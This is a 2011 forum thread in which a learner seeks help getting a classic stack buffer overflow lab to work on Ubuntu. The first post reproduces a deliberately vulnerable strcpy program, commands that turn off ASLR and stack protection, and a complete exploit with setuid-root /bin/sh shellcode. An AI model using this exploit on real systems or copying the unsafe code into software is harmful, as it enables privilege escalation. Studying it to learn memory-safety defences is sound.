---
title: "buffer overflow problem - help !"
date: 2011-05-25
forum: Security
---

### Post by shanwu on 2011-05-25
Hi, folks, 
    I was trying to learn what a stack-based buffer overflow is… so I read the book, find the example, code it, but it doesn’t work. My Ubuntu keep showing message like “Segmentation fault”

    I learned about there are 2 buffer overflow prevention schemes I must turn them off so I can get my program to run, so for those procedures I did were: 

Procedure 0: turn off the random memory address scheme by entering command
&#61656;	#echo 0 > /proc/sys/kernel/randomize_va_space
 
Procedure 1: compile the vulnerable program “vuln.c” with command
&#61656;	$gcc -fno-stack-protector -o vuln vuln.c
[COLOR="Blue"]Source code of vuln.c:  

#include <stdlib.h>
#include <string.h>
int main(int argc,char *argv[])
{
   char buffer[500];
   strcpy(buffer,argv[1]);
   return 0;

}[/COLOR]

Procedure 2:compile the exploit program,”exploit.c”, which is going to exploit the vuln
&#61656;	$gcc –o exploit exploit.c
[COLOR="blue"]Source code of exploit.c:

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

char shellcode[]="\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0"
                 "\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d"
                 "\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73"
                 "\x68";

unsigned long sp(void){ asm("movl %esp, %eax");}  

int main(int argc, char *argv[])
{
   int i,offset;
   unsigned int esp, ret, *addr_ptr;
   char *buffer, *ptr;
   offset=0;
   esp=sp();
   ret=esp-offset;
   printf("Stack pointer (ESP     : 0x%x\n",esp);
   printf("    Offset from ESP    : 0x%x\n",offset);
   printf("Desired Return Address : 0x%x\n",ret);
   
   buffer=malloc(600);
   ptr=buffer;
   addr_ptr=(unsigned int *)ptr;
   for(i=0;i<600;i+=4)
   {
      *(addr_ptr++)=ret;

   }
  
   for(i=0;i<200;i++)
   {
      buffer[i]='\x90';
   }

   ptr=buffer+200;
   for(i=0;i<strlen(shellcode);i++)
   {
      *(ptr++)=shellcode[i];

   }

   buffer[600-1]=0;
   
   execl("./vuln","vuln",buffer,(char *)NULL);
 
   free(buffer);
  
   return 0; 
}
[/COLOR]
Procedure 3 : Run the exploit, it supposed to show me that I got the root privilege since vuln belongs to root, but this part keep showing message “segmentation fault” Please advise me what I should do to make this program successfully demonstrate buffer overflow. Thanks ! 
 

even the exploit.c compiled with a warning but it still compiles. 

and this is the source I found about ubuntu buffer overflow prevention schemes [http://ubuntuforums.org/showthread.php?t=570676](http://ubuntuforums.org/showthread.php?t=570676)

---

### Post by shanwu on 2011-05-26
Does anyone know... ? 
or Did I post this article on the wrong forum? :confused:

---

### Post by psusi on 2011-05-26
Are you running i386 or amd64?

---

### Post by shanwu on 2011-05-27
I use the command "uname -a" and it shows 

linux ubuntu 2.6.35-22-generic #33-ubuntu SMP ...(Date)...i686 GNU/Linux

since it's a i686, so it's a [COLOR="Blue"]32-bit OS[/COLOR]. 

and I also check the file /proc/cpuinfo with the command: "cat cpuinfo"

and it shows 

Model Name: AMD Turion(tm) 64x2 TL-58, and it's a [COLOR="blue"]64-bit processor[/COLOR]...

so this could be one of the reason why it cause a segmentation fault..?

---

### Post by shanwu on 2011-05-29
for now I learned there are 3 schemes prevents the stack based buffer overflow...

1 gcc compiler
2 linux kernel 
3 CPU with NX bit 

I hope this can save somebody's time in the future ...I will keep trying the other kinds of buffer overflow... thanks guys :)

---

